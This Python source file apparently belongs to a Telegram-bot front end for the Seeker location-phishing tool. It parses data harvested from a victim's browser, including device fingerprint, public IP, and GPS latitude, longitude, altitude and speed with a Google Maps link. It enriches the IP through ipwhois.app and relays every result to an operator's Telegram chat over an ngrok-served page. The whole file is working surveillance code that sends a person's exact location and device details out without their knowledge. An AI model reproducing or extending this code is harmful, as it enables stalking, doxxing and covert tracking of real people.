
import requests
import traceback
from json import decoder
from seekerServer import stop_ngrok  # Import the stop_ngrok function

def seeker_data_parser(INFO, loads, ip_address, RESULT, clear, bot, chat_id, cl_quit, SERVER_PROC):
    data_row = []
    with open(INFO, 'r') as info_file:
        info_file = info_file.read()
    try:
        info_json = loads(info_file)
    except decoder.JSONDecodeError:
        print(f'[-] Exception : {traceback.format_exc()}')
    else:
        var_os = info_json['os']
        var_platform = info_json['platform']
        var_cores = info_json['cores']
        var_ram = info_json['ram']
        var_vendor = info_json['vendor']
        var_render = info_json['render']
        var_res = info_json['wd'] + 'x' + info_json['ht']
        var_browser = info_json['browser']
        var_ip = info_json['ip']

        data_row.extend([var_os, var_platform, var_cores, var_ram,
                        var_vendor, var_render, var_res, var_browser, var_ip])

        device_info=(f'''[🖥] Device Information :

[+] OS         : {var_os}
[+] Platform   : {var_platform}
[+] CPU Cores  : {var_cores}
[+] RAM        : {var_ram}
[+] GPU Vendor : {var_vendor}
[+] GPU        : {var_render}
[+] Resolution : {var_res}
[+] Browser    : {var_browser}
[+] Public IP  : {var_ip}
''')
        bot.send_message(chat_id, device_info)
        if ip_address(var_ip).is_private:
            print(f'[📡] Skipping IP recon because IP address is private')
        else:
            rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
            s_code = rqst.status_code

            if s_code == 200:
                data = rqst.text
                data = loads(data)
                var_continent = str(data['continent'])
                var_country = str(data['country'])
                var_region = str(data['region'])
                var_city = str(data['city'])
                var_org = str(data['org'])
                var_isp = str(data['isp'])

                data_row.extend([var_continent, var_country,
                                var_region, var_city, var_org, var_isp])

                ip_info=(f'''[📡] IP Information :

[+] Continent : {var_continent}
[+] Country   : {var_country}
[+] Region    : {var_region}
[+] City      : {var_city}
[+] Org       : {var_org}
[+] ISP       : {var_isp}
''')
                bot.send_message(chat_id, ip_info)

    with open(RESULT, 'r') as result_file:
        results = result_file.read()
        try:
            result_json = loads(results)
        except decoder.JSONDecodeError:
            print(f'[-] Exception : {traceback.format_exc()}')
        else:
            status = result_json['status']
            if status == 'success':
                var_lat = result_json['lat']
                var_lon = result_json['lon']
                var_acc = result_json['acc']
                var_alt = result_json['alt']
                var_dir = result_json['dir']
                var_spd = result_json['spd']

                data_row.extend([var_lat, var_lon, var_acc,
                                var_alt, var_dir, var_spd])

                local_info=(f'''[🌍] Location Information :

[+] Latitude  : {var_lat}
[+] Longitude : {var_lon}
[+] Accuracy  : {var_acc}
[+] Altitude  : {var_alt}
[+] Direction : {var_dir}
[+] Speed     : {var_spd}
[+] Google Maps : https://www.google.com/maps/place/{var_lat.strip(" deg")}+{var_lon.strip(" deg")}
''')
                bot.send_message(chat_id, local_info)


            else:
                var_err = result_json['error']
                print(f'[-] {var_err}\n')
    cl_quit(SERVER_PROC)
    stop_ngrok()
    clear()
    return
